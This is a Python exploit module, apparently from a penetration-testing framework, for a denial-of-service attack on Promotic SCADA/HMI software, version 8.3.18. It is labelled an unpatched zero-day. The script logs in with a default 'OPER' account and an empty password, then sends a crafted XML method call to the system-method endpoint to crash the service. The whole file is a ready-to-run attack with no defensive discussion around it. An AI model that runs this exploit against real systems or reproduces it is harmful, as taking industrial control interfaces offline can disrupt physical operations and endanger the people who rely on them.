#!/usr/bin/env python
import urllib2
import base64
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_promotic_scada_dos"
INFO['DESCRIPTION'] = "Promotic SCADA/HMI DoS"
INFO['VENDOR'] = "http://www.promotic.eu/en/index.htm"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Specially crafted POST request cause DoS.
Tested against PROMOTIC 8.3.18 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "http://www.promotic.eu/en/promotic/download/Pm0803.htm"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "13 July, 2017"
INFO['PATH'] = "Dos/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["USERNAME"] = "OPER"
OPTIONS["PASSWORD"] = ""


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])

    def make_url(self, path=''):
        url = 'http://{}:{}/'.format(self.host, self.port) + path
        return url

    def make_request(self, url, data=None):
        request = urllib2.Request(url, data)
        base64string = base64.b64encode('%s:%s' % (self.username, self.password))
        request.add_header("Authorization", "Basic %s" % base64string)
        try:
            resp = urllib2.urlopen(request)
        except urllib2.HTTPError as e:
            if e.code == 401 or e.code == 403:
                self.log('[-] Can\'t login using {}:{}'.format(self.username, self.password))
                self.finish(False)
            else:
                raise e
        return resp

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Trying to connect to {}'.format(url))
        self.make_request(self.make_url())
        self.log('[*] Sending DoS request')
        data = '''<?xml version='1.0' encoding='UTF-8'?>
<pm><MethCall name="FindViewers"><Par>sgroups:menu;viewers:{};</Par><Par>s</Par><Par>scolumns:path,title,alstate3,alstate2,alstate1,alhoot;</Par></MethCall></pm>'''
        data = data.format('alarm_state,' * 20)
        try:
            self.make_request(self.make_url('syst/sysmeth.xml'), data)
        except Exception as e:
            self.log('[+] DoS succeeded')
            self.finish(True)
        self.finish(False)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()